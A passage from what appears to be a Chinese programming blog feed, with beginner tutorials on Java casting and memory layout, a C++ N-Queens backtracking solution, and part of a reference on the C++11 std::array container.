class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出姓名&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Man 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的姓名&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">out</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<span class="hljs-comment">//向上转型。编译看左，运行看右</span><br>        p.outAge(); <span class="hljs-comment">//同方法名，输出的是子类中的方法</span><br>        p.outName(); <span class="hljs-comment">//输出的是子类中的方法</span><br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br></code></pre></div></td></tr></table></figure><h2 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h2><p>需要输出父类中没有，但子类中有的方法时，需要将其向下转型。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Person 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;输出姓名&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//Man 类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Man</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String name;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outAge</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的年龄&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">outName</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人的姓名&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">out</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;男人&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<span class="hljs-comment">//向上转型。编译看左，运行看右</span><br>        p.outAge(); <span class="hljs-comment">//同方法名，输出的是子类中的方法</span><br>        p.outName(); <span class="hljs-comment">//输出的是子类中的方法</span><br>        Man m = <span class="hljs-keyword">new</span> Man();<br>        m = (Man) p; <span class="hljs-comment">//向下转型</span><br>        m.out();<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br>男人<br></code></pre></div></td></tr></table></figure><p>当在转型时，可能是会转型失败的。所以，需要来判断一下关系。用 instanceof 。</p><p>将上例中的测试代码改正一下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Person p = <span class="hljs-keyword">new</span> Man();<br>        p.outAge();<br>        p.outName();<br>        <span class="hljs-keyword">if</span>(p <span class="hljs-keyword">instanceof</span> Person)&#123; <span class="hljs-comment">//判断 p 是否是 Person，如果是则进行转型，否则不进行。</span><br>        Man m = <span class="hljs-keyword">new</span> Man();<br>        m = (Man) p;<br>        m.out();<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br>男人的年龄<br>男人的姓名<br>男人<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习(六)-内存结构简单说明</title>
    <link href="/2021/04/17/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AD)-%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E/"/>
    <url>/2021/04/17/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0(%E5%85%AD)-%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习(六)。简单说明记录在内存中数据的存储位置。</p><h2 id="栈、堆、方法区"><a href="#栈、堆、方法区" class="headerlink" title="栈、堆、方法区"></a>栈、堆、方法区</h2><blockquote><p>栈（stack）：存放局部变量，即方法中的变量。包括main函数中的变量。</p></blockquote><blockquote><p>堆（heap）：存放通过 New 出来的结构，如：对象、数组。</p></blockquote><blockquote><p>方法区：又叫静态区，跟堆一样，被所有的线程共享。类的加载信息、静态域、常量池。方法区包含所有的class和static变量。<br>方法区中包含的都是在整个程序中永远唯一的元素，如class,static变量。</p></blockquote><p>如图所示：<br><img src="https://img-blog.csdnimg.cn/20210417132424525.png"></p><h2 id="一维数组的内存解析"><a href="#一维数组的内存解析" class="headerlink" title="一维数组的内存解析"></a>一维数组的内存解析</h2><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>String[] arr1 = <span class="hljs-keyword">new</span> String[<span class="hljs-number">4</span>];<br>arr1[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;刘德华&quot;</span>;<br>arr1[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;张学友&quot;</span>;<br>arr1 = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];<br></code></pre></div></td></tr></table></figure><p>首先，我们先看第一句话。<br>int[] arr 是在栈中的，new int[]{1,2,3} 是在堆中的。并且初始化他们为默认值。它们之间是通过地址来连接的。</p><p>String[] att 同样也是在栈中，new String[4]是在堆中。并且初始化他们为默认值。他们之间也是通过地址连接的。att[1] = “刘德华”;att[2] = “张学友”;就是赋值。</p><p>arr1 = new String[3] 是又重新在堆中开辟了一个新空间。</p><p>具体表示如图所示，被红线划掉的表示的是开始时的默认值：</p><p><img src="https://img-blog.csdnimg.cn/20210417134816346.png"></p><h2 id="二维数组的内存解析"><a href="#二维数组的内存解析" class="headerlink" title="二维数组的内存解析"></a>二维数组的内存解析</h2><p>同一维数组一样的道理，如图,其中被红线划掉的表示的是开始的默认值：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[][] arr1 = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>][];<br>arr1[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br>arr1[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">4</span>];<br>arr1[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = <span class="hljs-number">30</span>;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210417135549401.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM经典问题-N皇后问题</title>
    <link href="/2021/04/16/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/"/>
    <url>/2021/04/16/ACM%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98-N%E7%9A%87%E5%90%8E%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在N*N的方格棋盘放置了N个皇后，使得它们不相互攻击（即任意2个皇后不允许处在同一排，同一列，也不允许处在与棋盘边框成45角的斜线上。<br>你的任务是，对于给定的N，求出有多少种合法的放置方法。</p><h3 id="问题思路解析"><a href="#问题思路解析" class="headerlink" title="问题思路解析"></a>问题思路解析</h3><p><a href="https://www.bilibili.com/video/BV1bK4y1n7iq?share_source=copy_web">N皇后视频讲解</a></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-comment">//#include&lt;bits/stdc++.h&gt;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stack&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cmath&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOS ios::sync_with_stdio(0);cin.tie(0),cout.tie(0);</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> maxn=<span class="hljs-number">1e7</span>+<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> minn=<span class="hljs-number">1e2</span>+<span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI acos(-1)</span><br><span class="hljs-keyword">int</span> a[minn];<span class="hljs-comment">//a[i]表示第i行上的皇后放于a[i]列上，例如：a[3]=7；表示第三行的皇后位于第7列上。</span><br><span class="hljs-keyword">int</span> n;<br><span class="hljs-keyword">int</span> ans=<span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> row,<span class="hljs-keyword">int</span> col)</span></span>&#123; <span class="hljs-comment">//判断第row行的皇后能不能放在第col列</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=row;++i)&#123; <span class="hljs-comment">//从第一行开始判断，一直判断到当前行。后面的行不需要判断，因为每一行就只放一个皇后，后面的行还没有开始放。</span><br><span class="hljs-keyword">if</span>(a[i]==col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//如果第i行就已经占了col列，表示不能放在col列</span><br><span class="hljs-keyword">if</span>(i+a[i]==row+col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//如果行和列的之和相等，即在平行与副对角线的斜线上。</span><br><span class="hljs-keyword">if</span>(i-a[i]==row-col) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//如果行和列的之差相等，即在平行与主对角线的斜线上。</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> row)</span></span>&#123; <span class="hljs-comment">//表示第i行的皇后放于何处</span><br><span class="hljs-keyword">if</span>(row==n+<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//当行数超过了所给行，表示有一种解。</span><br>ans++;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;++i)&#123;<br><span class="hljs-keyword">if</span>(check(row,i))&#123; <span class="hljs-comment">//看row行的皇后能不能放在第i列</span><br>a[row]=i;<br>dfs(row+<span class="hljs-number">1</span>);<br>a[row]=<span class="hljs-number">0</span>; <span class="hljs-comment">//回溯</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&amp;&amp;n)&#123;<br>ans=<span class="hljs-number">0</span>;<br>dfs(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>IOS;<br>solve();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM经典问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-C++STL新增容器</title>
    <link href="/2021/04/15/ACM-C++STL%E6%96%B0%E5%A2%9E%E5%AE%B9%E5%99%A8/"/>
    <url>/2021/04/15/ACM-C++STL%E6%96%B0%E5%A2%9E%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>介绍记录STL提供新增加的容器，记录其用法和一些相关的函数。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="一-STL新增容器"><a href="#一-STL新增容器" class="headerlink" title="一.STL新增容器"></a>一.STL新增容器</h3><p><strong>注意：</strong> 在一些编译器中是不能正常使用新增的容器的。这点需要注意。</p><h4 id="1-array容器"><a href="#1-array容器" class="headerlink" title="1.array容器"></a>1.array容器</h4><p>array 容器是 C++ 11 标准中新增的序列容器，简单地理解，它就是在 C++ 普通数组的基础上，添加了一些成员函数和全局函数。在使用上，它比普通数组更安全，且效率并没有因此变差。和其它容器不同，array 容器的大小是固定的，无法动态的扩展或收缩，这也就意味着，在使用该容器的过程无法借由增加或移除元素而改变其大小，它只允许访问或者替换存储的元素。<br>array 容器以类模板的形式定义在 <array> 头文件，并位于命名空间 std 中。如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>&#123;<br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-keyword">size_t</span> N&gt;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">array</span>;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>在 array&lt;T,N&gt; 类模板中，T 用于指明容器中的存储的具体数据类型，N 用于指明容器的大小，需要注意的是，这里的 N 必须是常量，不能用变量表示。<br>array 容器有多种初始化方式，如下代码展示了如何创建具有 10 个 double 类型元素的 array 容器：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values;<br></code></pre></div></td></tr></table></figure><p><strong>如果程序中已经默认指定了 std 命令空间，这里可以省略 std::。</strong><br>这样就创建好了一个名为 values 的 array 容器，其包含 10 个浮点型元素。但是，由于未显式指定这 10 个元素的值，因此使用这种方式创建的容器中，各个元素的值是不确定的（array 容器不会做默认初始化操作）。</p><p>通过如下创建 array 容器的方式，可以将所有的元素初始化为 0 或者和默认元素类型等效的值：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values &#123;&#125;; <span class="hljs-comment">//容器中所有的元素都会被初始化为 0.0。</span><br></code></pre></div></td></tr></table></figure><p>在创建 array 容器的实例时，也可以像创建常规数组那样对元素进行初始化：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">double</span>, 10&gt; values &#123;<span class="hljs-number">0.5</span>,<span class="hljs-number">1.0</span>,<span class="hljs-number">1.5</span>,<span class="hljs-number">2.0</span>&#125;;<br></code></pre></div></td></tr></table></figure><p>这里只初始化了前 4 个元素，剩余的元素都会被初始化为 0.0。</p><p>除此之外，array 容器还提供有很多功能实用的成员函数，</p><table><thead><tr><th>成员函数</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个元素的随机访问迭代器。</td></tr><tr><td>end()</td><td>返回指向容器最后一个元素之后一个位置的随机访问迭代器，通常和 begin() 结合使用。</td></tr><tr><td>rbegin()</td><td>返回指向最后一个元素的随机访问迭代器。</td></tr><tr><td>rend()</td><td>返回指向第一个元素之前一个位置的随机访问迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，不能用于修改元素。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>crbegin()</td><td>和 rbegin() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>crend()</td><td>和 rend() 功能相同，只不过在其基础上，增加了 const 属性，不能用于修改元素。</td></tr><tr><td>size()</td><td>返回容器中当前元素的数量，其值始终等于初始化 array 类的第二个模板参数 N。</td></tr><tr><td>max_size()</td><td>返回容器可容纳元素的最大数量，其值始终等于初始化 array 类的第二个模板参数 N。</td></tr><tr><td>empty()</td><td>判断容器是否为空，和通过 size()==0 的判断条件功能相同，但其效率可能更快。</td></tr><tr><td>at(n)</td><td>返回容器中 n 位置处元素的引用，该函数自动检查 n 是否在有效的范围内，如果不是则抛出 out_of_range 异常。</td></tr><tr><td>front()</td><td>返回容器中第一个元素的直接引用，该函数不适用于空的 array 容器。</td></tr><tr><td>back()</td><td>返回容器中最后一个元素的直接应用，该函数同样不适用于空的 array 容器。</td></tr><tr><td>data()</td><td>返回一个指向容器首个元素的指针。利用该指针，可实现复制容器中所有元素等类似功能。</td></tr><tr><td>fill(val)</td><td>将 val 这个值赋值给容器中的每个元素。</td></tr><tr><td>array1.swap(array2)</td><td>交换 array1 和 array2 容器中的所有元素，但前提是它们具有相同的长度和类型。</td></tr></tbody></table><p>除此之外，C++ 11 标准库还新增加了 begin() 和 end() 这 2 个函数，和 array 容器包含的 begin() 和 end() 成员函数不同的是，标准库提供的这 2 个函数的操作对象，既可以是容器，还可以是普通数组。当操作对象是容器时，它和容器包含的 begin() 和 end() 成员函数的功能完全相同；如果操作对象是普通数组，则 begin() 函数返回的是指向数组第一个元素的指针，同样 end() 返回指向数组中最后一个元素之后一个位置的指针（注意不是最后一个元素）。</p><p>在 <array> 头文件中还重载了 get() 全局函数，该重载函数的功能是访问容器中指定的元素，并返回该元素的引用。正是由于 array 容器中包含了 at() 这样的成员函数，使得操作元素时比普通数组更安全。</p><p>部分成员函数演示运用代码：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">array</span>&lt;<span class="hljs-keyword">int</span>, 4&gt; values&#123;&#125;;<br>    <span 